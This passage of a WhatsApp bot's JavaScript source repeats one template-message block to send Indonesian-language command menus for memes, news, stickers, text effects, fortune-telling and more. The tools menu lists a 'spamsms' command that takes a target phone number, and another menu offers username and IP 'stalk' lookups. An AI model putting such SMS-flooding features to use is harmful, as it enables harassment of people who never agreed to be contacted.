  ➙ ${prefix}darkjoke
  ➙ ${prefix}memeindo
  ➙ ${prefix}memeglobal
`
    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
          case '12345mememakermenu':  {
  	anu = `*✧ Meme Maker Menu ✧*
  
  ➙ ${prefix}meme1 [teks]
  ➙ ${prefix}mem2 [teks1+teks2]
  ➙ ${prefix}meme3 [teks1+teks2+teks3]
  ➙ ${prefix}meme4 [teks]
  ➙ ${prefix}meme5 [teks]
  ➙ ${prefix}meme6 [teks1+teks2+teks3]
  ➙ ${prefix}mem7 [teks1+teks2]
  ➙ ${prefix}meme8 [teks1+teks2+teks3]
  ➙ ${prefix}kanna [teks]
  ➙ ${prefix}mind [teks]
  ➙ ${prefix}ohno [teks]
  ➙ ${prefix}smeme [teks1+teks2] _Reply Image_
  ➙ ${prefix}memecreator [teks1+teks2] _Reply Image_
`
    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
          case '12345beritamenu':  {
  	anu = `*✧ News Berita Menu ✧*
  
  ➙ ${prefix}hoax
  ➙ ${prefix}newsinfo
  ➙ ${prefix}liputan6
  ➙ ${prefix}republika
  ➙ ${prefix}kumparan
  ➙ ${prefix}detiknews
  ➙ ${prefix}jalantikus
  ➙ ${prefix}cnnindonesia
  ➙ ${prefix}cnnnasional
  ➙ ${prefix}cnninternasional
  ➙ ${prefix}cnnolahraga
  ➙ ${prefix}cnnteknologi
  ➙ ${prefix}cnnhiburan
  ➙ ${prefix}cnnsocial
`
    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
          case '12345photoeditormenu':  {
  	anu = `*✧ Photo Editor ✧*
  
  ➙ ${prefix}wasted _Reply Foto_ 
  ➙ ${prefix}pencil _Reply Foto_ 
  ➙ ${prefix}triggered _Reply Foto_
  ➙ ${prefix}fisheye _Reply Foto_
  ➙ ${prefix}skullmask _Reply Foto_
  ➙ ${prefix}cartoon _Reply Foto_
  ➙ ${prefix}invert _Reply Foto_
  ➙ ${prefix}pixelate _Reply Foto_
  ➙ ${prefix}flip _Reply Foto_
  ➙ ${prefix}grayscale _Reply Foto_
  ➙ ${prefix}roundimage _Reply Foto_
  
  ➙ ${prefix}affect _Reply Foto_
  ➙ ${prefix}beautiful _Reply Foto_
  ➙ ${prefix}facepalm _Reply Foto_
  ➙ ${prefix}hitler _Reply Foto_
  ➙ ${prefix}jail _Reply Foto_
  ➙ ${prefix}jokeoverhead _Reply Foto_
  ➙ ${prefix}rainbow _Reply Foto_
  ➙ ${prefix}sepia _Reply Foto_
  ➙ ${prefix}trash _Reply Foto_
  ➙ ${prefix}wanted _Reply Foto_
  
  ➙ ${prefix}1977 _Reply Foto_
  ➙ ${prefix}aden _Reply Foto_
  ➙ ${prefix}brannan _Reply Foto_
  ➙ ${prefix}brooklyn _Reply Foto_
  ➙ ${prefix}gingham _Reply Foto_
  ➙ ${prefix}hudson _Reply Foto_ 
  ➙ ${prefix}inkwell _Reply Foto_
  ➙ ${prefix}earlybird _Reply Foto_
  ➙ ${prefix}kelvin _Reply Foto_
  ➙ ${prefix}larlk _Reply Foto_
  ➙ ${prefix}lofi _Reply Foto_
  ➙ ${prefix}maven _Reply Foto_ 
  ➙ ${prefix}mayfair _Reply Foto_
  ➙ ${prefix}moon _Reply Foto_
  ➙ ${prefix}perpetua _Reply Foto_
  ➙ ${prefix}nashville _Reply Foto_
  ➙ ${prefix}reyes _Reply Foto_
  ➙ ${prefix}rise _Reply Foto_
  ➙ ${prefix}slumber _Reply Foto_
  ➙ ${prefix}stinson _Reply Foto_
  ➙ ${prefix}toaster _Reply Foto_
  ➙ ${prefix}valencia _Reply Foto_
  ➙ ${prefix}walden _Reply Foto_
  ➙ ${prefix}willow _Reply Foto_
  ➙ ${prefix}gingham _Reply Foto_
  ➙ ${prefix}xpro2 _Reply Foto_
`
    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
          case '12345primbonmenu':  {
  	anu = `*✧ Primbon Menu ✧*
  
  ➙ ${prefix}nomerhoki [nomor]
  ➙ ${prefix}artimimpi [mimpi apa]
  ➙ ${prefix}ramalanjodoh
  ➙ ${prefix}ramalanjodohbali
  ➙ ${prefix}suamiistri
  ➙ ${prefix}ramalancinta
  ➙ ${prefix}artinama [nama]
  ➙ ${prefix}kecocokannama
  ➙ ${prefix}kecocokanpasangan
  ➙ ${prefix}jadianpernikahan
  ➙ ${prefix}sifatusaha
  ➙ ${prefix}rezeki
  ➙ ${prefix}pekerjaan
  ➙ ${prefix}ramalannasib
  ➙ ${prefix}potensipenyakit
  ➙ ${prefix}artitarot
  ➙ ${prefix}fengshui
  ➙ ${prefix}haribaik
  ➙ ${prefix}harisangar
  ➙ ${prefix}harisial
  ➙ ${prefix}nagahari
  ➙ ${prefix}arahrejeki
  ➙ ${prefix}peruntungan
  ➙ ${prefix}weton
  ➙ ${prefix}karakter
  ➙ ${prefix}keberuntungan
  ➙ ${prefix}memancing
  ➙ ${prefix}masasubur
  ➙ ${prefix}zodiak
`
    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
          case '12345quotesmenu':  {
  	anu = `*✧ Quotes Menu ✧*
  
  ➙ ${prefix}quotes
  ➙ ${prefix}quotesislami
  ➙ ${prefix}quotesanime
  ➙ ${prefix}quotesdilan
  ➙ ${prefix}katabijak [query]
  ➙ ${prefix}katabucin
`
    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
          case '12345quotesmakermenu':  {
  	anu = `*✧ Quotes Maker Menu ✧*
  
  ➙ ${prefix}qmaker [quotes]
  ➙ ${prefix}qmaker2 [author+quotes]
  ➙ ${prefix}qmaker3 [quotes] _Reply image_
`
    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
          case '12345randomimage':  {
  	anu = `*✧ Random Image ✧*
  
  ➙ ${prefix}rblackpink
  ➙ ${prefix}bts
  ➙ ${prefix}exo
  ➙ ${prefix}cecan
  ➙ ${prefix}cogan
  ➙ ${prefix}estetic
  ➙ ${prefix}elf
  ➙ ${prefix}loli
  ➙ ${prefix}neko
  ➙ ${prefix}waifu
  ➙ ${prefix}shota
  ➙ ${prefix}husbu
  ➙ ${prefix}sagiri
  ➙ ${prefix}elaina
  ➙ ${prefix}shinobu
  ➙ ${prefix}kanna
  ➙ ${prefix}megumin
  ➙ ${prefix}art
  ➙ ${prefix}wallnime
  ➙ ${prefix}neko2
  ➙ ${prefix},gif
  ➙ ${prefix}feed
  ➙ ${prefix}kiss
  ➙ ${prefix}smug
  ➙ ${prefix}tickle
  ➙ ${prefix}cuddle
  ➙ ${prefix}fox_girl
  ➙ ${prefix}bully
  ➙ ${prefix}cry
  ➙ ${prefix}hug
  ➙ ${prefix}awoo
  ➙ ${prefix}lick
  ➙ ${prefix}pat
  ➙ ${prefix}bonk
  ➙ ${prefix}yeet
  ➙ ${prefix}blush
  ➙ ${prefix}smile
  ➙ ${prefix}wave
  ➙ ${prefix}highfive
  ➙ ${prefix}handhold
  ➙ ${prefix}nom
  ➙ ${prefix}bite
  ➙ ${prefix}glomp
  ➙ ${prefix}kill
  ➙ ${prefix}slap
  ➙ ${prefix}happy
  ➙ ${prefix}wink
  ➙ ${prefix}dance
  ➙ ${prefix}cringe
  ➙ ${prefix}gasm
`
    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
          case '12345randomteks':  {
  	anu = `*✧ Random Teks ✧*
  
  ➙ ${prefix}faktaunik
  ➙ ${prefix}quotes
  ➙ ${prefix}quotesanime
  ➙ ${prefix}quotesdilan
  ➙ ${prefix}quotesislami
  ➙ ${prefix}katabucin
  ➙ ${prefix}cerpen
  ➙ ${prefix}puisi
  ➙ ${prefix}pantun
  ➙ ${prefix}nasihat
  ➙ ${prefix}ceritahoror
`
    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
          case '12345searchmenu':  {
  	anu = `*✧ Search Menu ✧*
  
  ➙ ${prefix}groupwa [query]
  ➙ ${prefix}play [query]
  ➙ ${prefix}ytsearch [query]
  ➙ ${prefix}gimage [query]
  ➙ ${prefix}gimage [query]
  ➙ ${prefix}pinterest [query]
  ➙ ${prefix}wikipedia [query]
  ➙ ${prefix}wikimedia [query]
  ➙ ${prefix}wallpaper [query]
  ➙ ${prefix}unsplash [query]
  ➙ ${prefix}pixiv [query]
  ➙ ${prefix}ringtone [query]
  ➙ ${prefix}katabijak [query]
  ➙ ${prefix}barinly [query]
  ➙ ${prefix}animesearch [query]
  ➙ ${prefix}mangasearch [query]
  ➙ ${prefix}character [query]
  ➙ ${prefix}kusonimes [query]
  ➙ ${prefix}chord [judul lagu]
`
    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
          case '12345sekolahmenu':  {
  	anu = `*✧ Sekolah Menu ✧*
  
  ➙ ${prefix}nulis [teks]
  ➙ ${prefix}brainly [soal]
  ➙ ${prefix}google [query]
  ➙ ${prefix}translate [teks]
  ➙ ${prefix}tst [teks]
  ➙ ${prefix}ocr _Reply image_
  ➙ ${prefix}tts [teks]
`
    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
          case '12345sertifikatmenu':  {
  	anu = `*✧ Sertifikat Menu ✧*
  
  ➙ ${prefix}ytsilver [nama]
  ➙ ${prefix}ytgold [nama]
  ➙ ${prefix}tolol [nama]
  ➙ ${prefix}bucin [nama]
  ➙ ${prefix}fuckgirl [nama]
  ➙ ${prefix}fuckboy [nama]
  ➙ ${prefix}goodgirl [nama]
  ➙ ${prefix}goodboy [nama]
  ➙ ${prefix}badgirl [nama]
  ➙ ${prefix}badboy [nama]
  ➙ ${prefix}pacar [nama1 nama2]
`
    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
          case '12345stalkmenu':  {
  	anu = `*✧ Stalk Menu ✧*
  
  ➙ ${prefix}igstalk [username]
  ➙ ${prefix}tiktokstalk [username]
  ➙ ${prefix}twitterstalk [username]
  ➙ ${prefix}githubstalk [username]
  ➙ ${prefix}youtubestalk [nama channel]
  ➙ ${prefix}ipinfo [IP Address]
`
    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
          case '12345stickermenu':  {
  	anu = `*✧ Sticker Menu ✧*
  
  ➙ ${prefix}harta [teks]
  ➙ ${prefix}hartacustom [teks]
  ➙ ${prefix}sticker _reply image/video_
  ➙ ${prefix}toimg _reply sticker_
  ➙ ${prefix}tovideo _reply sticker_
  ➙ ${prefix}togif _Reply sticker_
  ➙ ${prefix}attp [teks]
  ➙ ${prefix}attp2 [teks]
  ➙ ${prefix}ttp [teks]
  ➙ ${prefix}ttp2 [teks]
  ➙ ${prefix}ttp3 [teks]
  ➙ ${prefix}ttp4 [teks]
  ➙ ${prefix}ttp5 [teks]
  ➙ ${prefix}ttp6 [teks]
  ➙ ${prefix}smeme [teks1+teks2] _Reply Image_
  ➙ ${prefix}memecreator [teks1+teks2] _Reply Image_
  ➙ ${prefix}emojimix [emoji1+emoji2]
  ➙ ${prefix}patrick
  ➙ ${prefix}samongus
  ➙ ${prefix}gawrgura
`
    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
          case '12345teksmaker':  {
  	anu = `*✧ Teks Maker ✧*
  
     Top Maker
  ➙ ${prefix}style [teks]
  ➙ ${prefix}nulis [teks]
  ➙ ${prefix}harta [teks]
  ➙ ${prefix}hartacustom [teks]
  ➙ ${prefix}qrcode [teks]
  ➙ ${prefix}tiktokmaker [teks1 teks2]
  ➙ ${prefix}pornhub [teks1 teks2]
  ➙ ${prefix}pubg [teks1 teks2]
  ➙ ${prefix}battlefield4 [teks1 teks2]
  ➙ ${prefix}arcade8bit [teks1 teks2]
     Ephoto 360 Maker
  ➙ ${prefix}hologram3d [teks]
  ➙ ${prefix}birthdaycake [teks]
  ➙ ${prefix}lighttext [teks]
  ➙ ${prefix}galaxywallpaper [teks]
  ➙ ${prefix}luxurygold [teks]
  ➙ ${prefix}activegalaxybat [teks]
  ➙ ${prefix}textbyname [teks]
  ➙ ${prefix}starsnight [teks]
  ➙ ${prefix}aovwallpaper [teks]
  ➙ ${prefix}pubgmaskot [teks]
  ➙ ${prefix}mlwallpaper [teks]
  ➙ ${prefix}anonymhacker [teks]
  ➙ ${prefix}freefire [teks]
  ➙ ${prefix}avatardota [teks]
  ➙ ${prefix}avatarlolnew [teks]
  ➙ ${prefix}logogaming [teks]
     Photo Oxy Maker
  ➙ ${prefix}smoke [teks]
  ➙ ${prefix}romance [teks]
  ➙ ${prefix}cup2 [teks]
  ➙ ${prefix}shadow [teks]
  ➙ ${prefix}sandwriting [teks]
  ➙ ${prefix}coffe [teks]
  ➙ ${prefix}love [teks]
  ➙ ${prefix}undergrass [teks]
  ➙ ${prefix}lovemessage [teks]
  ➙ ${prefix}burnpaper [teks] 
  ➙ ${prefix}nature3d [teks]
  ➙ ${prefix}wolfmetal [teks]
  ➙ ${prefix}summer3d [teks]
  ➙ ${prefix}woodenboard [teks]
  ➙ ${prefix}woodheart [teks]
  ➙ ${prefix}flamming [teks]
  ➙ ${prefix}fallleaves [teks]
  ➙ ${prefix}summernature [teks]
  ➙ ${prefix}goldenrose [teks]
  ➙ ${prefix}underwater [teks]
  ➙ ${prefix}carvedwood [teks]
  ➙ ${prefix}harrypotter [teks]
     Text Pro Maker
  ➙ ${prefix}marvelstudio [teks1 teks2]
  ➙ ${prefix}ninjalogo [teks1 teks2]
  ➙ ${prefix}space [teks1 teks2]
  ➙ ${prefix}avenger [teks1 teks2]
  ➙ ${prefix}glitch [teks1 teks2]
  ➙ ${prefix}coolgravity [teks1 teks2]
  ➙ ${prefix}wallgravity [teks1 teks2]
  ➙ ${prefix}wolflogo [teks1 teks2]
  ➙ ${prefix}lionlogo [teks1 teks2]
  ➙ ${prefix}marvelstudio [teks1 teks2]
  ➙ ${prefix}blackpink [teks]
  ➙ ${prefix}neon [teks]
  ➙ ${prefix}greenneon [teks]
  ➙ ${prefix}futureneon [teks]
  ➙ ${prefix}sandwriting [teks]
  ➙ ${prefix}sandsummer [teks]
  ➙ ${prefix}sandengraved [teks]
  ➙ ${prefix}text1917 [teks]
  ➙ ${prefix}holographic [teks]
  ➙ ${prefix}neonlight [teks]
  ➙ ${prefix}metaldark [teks]
  ➙ ${prefix}halloween [teks]
  ➙ ${prefix}bloodfrosted [teks]
  ➙ ${prefix}newyearcard [teks]
  ➙ ${prefix}deluxesilver [teks]
  ➙ ${prefix}minion [teks]
  ➙ ${prefix}toxic [teks]
  ➙ ${prefix}bokeh [teks]
  ➙ ${prefix}natureleaves [teks]
  ➙ ${prefix}fireworksparkle [teks]
  ➙ ${prefix}jokerlogo [teks]
  ➙ ${prefix}icecold [teks]
  ➙ ${prefix}breakwall [teks]
  ➙ ${prefix}roadwarningbox3d [teks]
  ➙ ${prefix}strawberry [teks]
  ➙ ${prefix}thunder [teks]
  ➙ ${prefix}horrorblood [teks]
  ➙ ${prefix}summersand [teks]
  ➙ ${prefix}cloud [teks]
  ➙ ${prefix}luxury [teks]
  ➙ ${prefix}watercolor [teks]
  ➙ ${prefix}foggywindow [teks]
  ➙ ${prefix}harrypotter [teks]
  ➙ ${prefix}impressiveglitch [teks]
  ➙ ${prefix}magma [teks]
  ➙ ${prefix}wonderfulgraffiti [teks]
`
    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
          case '12345toolsmenu':  {
  	anu = `*✧ Tools & Internet Menu ✧*
  
  ➙ ${prefix}tts [teks]
  ➙ ${prefix}tts2 [KodeBahasa+teks]
  ➙ ${prefix}translate [teks]
  ➙ ${prefix}tst2 [KodeBahasa+teks]
  ➙ ${prefix}resum [teks]
  ➙ ${prefix}qrcode [teks]
  ➙ ${prefix}besarkecil [teks]
  ➙ ${prefix}bahasapurba [teks]
  ➙ ${prefix}style [teks]
  ➙ ${prefix}randombahasa [teks]
  ➙ ${prefix}readqr _Reply Foto QR_
  ➙ ${prefix}spamsms [nomor target]
  ➙ ${prefix}ocr _Reply Foto_
  ➙ ${prefix}cekumur _Reply Foto Wajah_
  ➙ ${prefix}cekwajah _Reply Foto Wajah_
  ➙ ${prefix}shortlink [ url ]
  ➙ ${prefix}ssweb [ url ]
  ➙ ${prefix}ssweb2 [ url ]
  ➙ ${prefix}shortlink2 [ url ]
  ➙ ${prefix}shortlink3 [ url ]
  ➙ ${prefix}shortlink4 [ url ]
  ➙ ${prefix}ipinfo [ IP Address ]
`
    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
          case '12345voicechanger':  {
  	anu = `*✧ Voice Changer Menu ✧*
  
_Reply Audio_
  ➙ ${prefix}bass
  ➙ ${prefix}blown
  ➙ ${prefix}deep
  ➙ ${prefix}earrape
  ➙ ${prefix}fast
  ➙ ${prefix}fat
  ➙ ${prefix}nightcore
  ➙ ${prefix}reverse
  ➙ ${prefix}robot
  ➙ ${prefix}slow
  ➙ ${prefix}squirrel
`
    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
          case '12345anonymouschatmenu':  {
  	anu = `*✧ Anonymous Chat Menu ✧*
  
  ➙ ${prefix}start ( Start Chat )
  ➙ ${prefix}next ( Next user )
  ➙ ${prefix}stop ( stop Anonymous chat )
`
    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
          case '12345emailmenu':  {
  	anu = `*✧ Email Sementara ✧*
  
  ➙ ${prefix}getemail
  ➙ ${prefix}cekidmail [username token]
  ➙ ${prefix}cekmail [username id-mail token]
`
    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
